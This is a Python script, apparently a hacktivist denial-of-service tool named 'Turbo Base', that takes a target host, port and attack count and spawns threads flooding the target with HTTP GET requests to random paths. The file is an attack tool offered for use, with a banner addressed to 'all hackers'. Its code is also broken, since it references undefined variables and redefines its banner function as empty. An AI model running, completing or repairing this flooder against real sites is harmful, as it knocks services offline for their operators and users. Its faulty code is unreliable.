import sys
print(sys.argv)

import math
from colorama import Fore, Style, init
import os
import time
import requests
import random
import string
import threading
import socket

# Inisialisasi colorama
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def typewriter(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_banner():
    clear()
    banner = """ >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> 
    |||||||||| ||     ||  ||||||||  ||||||||  ||||||| 
    |   ||     ||     ||  ||    ||  ||    ||  ||   || 
    |   ||     ||     ||  ||||||||  ||||||||  ||   ||
    |   ||     |||___|||  ||    ||  ||    ||  ||   ||
    |   ||     |||||||||  ||    ||  ||||||||  |||||||
    |>>>>>>>>>>>>>>>>> By Twin Lion <<<<<<<<<<<<<<<<< """
   
    print(Fore.GREEN + banner)
    typewriter(Fore.YELLOW + "TURBO BASE")
    print("Coded By : Twin Lion")
    print("Author : T34m BaSe_Nai")
    print("Github : github.com/Twinlion24434")
    print("Welcome Pejuang BRIGADE AL ASQA BASE_ NAI")
    print("Note- Greetings All Hackers Let's Take Part in the Struggle in the Humanitarian Mission to Defend Palestine")

def print_banner():
    # Kode banner di sini
    pass  # tambahkan kode banner di sini

print_banner()
time.sleep(5)
try:
    if len(sys.argv) != 4:
        print("Error: Argumen tidak lengkap")
        print("Usage: python3 Turbo_Base.py <Hostname> <Port> <Number_of_ATTACKS>")
        sys.exit(1)

    hostname = sys.argv[1]
    port = int(sys.argv[2])
    number_of_tl = int(sys.argv[3])
    print("Hostname:", hostname)
    print("Port:", port)
    print("Number of ATTACKS:", number_of_Attack)
except ValueError:
    print("Error: Port atau Number of ATTACKS bukan angka")

# Ubah FQDN ke IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Buat variabel bersama untuk jumlah utas
thread_num = 0
thread_num_mutex = threading.Lock()


# print status utas
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print output pada baris yang sama
    ph_value = str(slice)
    orp_value = str(slice)
    sys.stdout.write(f"{time.ctime().split()[3]} [{str(thread_num)}]")
    print(f" \033[92mTurbo_Base team  \033[97mSent packet TL24434\033[33m  [\033[32m"+ip+"\033[33m]\033[0m" )
    sys.stdout.write(f"{time.ctime().split()[3]} [{str(thread_num)}]")
    print(f" \033[32mTurbo_Base team  \033[33mSent packet TL24434\033[97m  [\033[35m"+ip+"\033[97m]\033[0m" )
    sys.stdout.write(f"{time.ctime().split()[3]} [{str(thread_num)}]")
    print(f" \033[37mTurbo_Base team  \033[96mSent packet TL24434\033[95m  [\033[93m"+ip+"\033[93m]\033[0m" )
    thread_num_mutex.release()
    
# Hasilkan Jalur URL
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Lakukan permintaan
def attack():
    print_status()
    url_path = generate_url_path()

    # Buat soket mentah
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Buka koneksi pada soket mentah tsb
        dos.connect((ip, port))

        # Kirim permintaan sesuai spesifikasi HTTP
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f" [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        # Tutup soket dengan rapi
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print (f"Sent massage Turbo_Base Team{1 + 1}")

# Memunculkan thread per permintaan
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  # Jadikan thread utama menunggu cabang thread
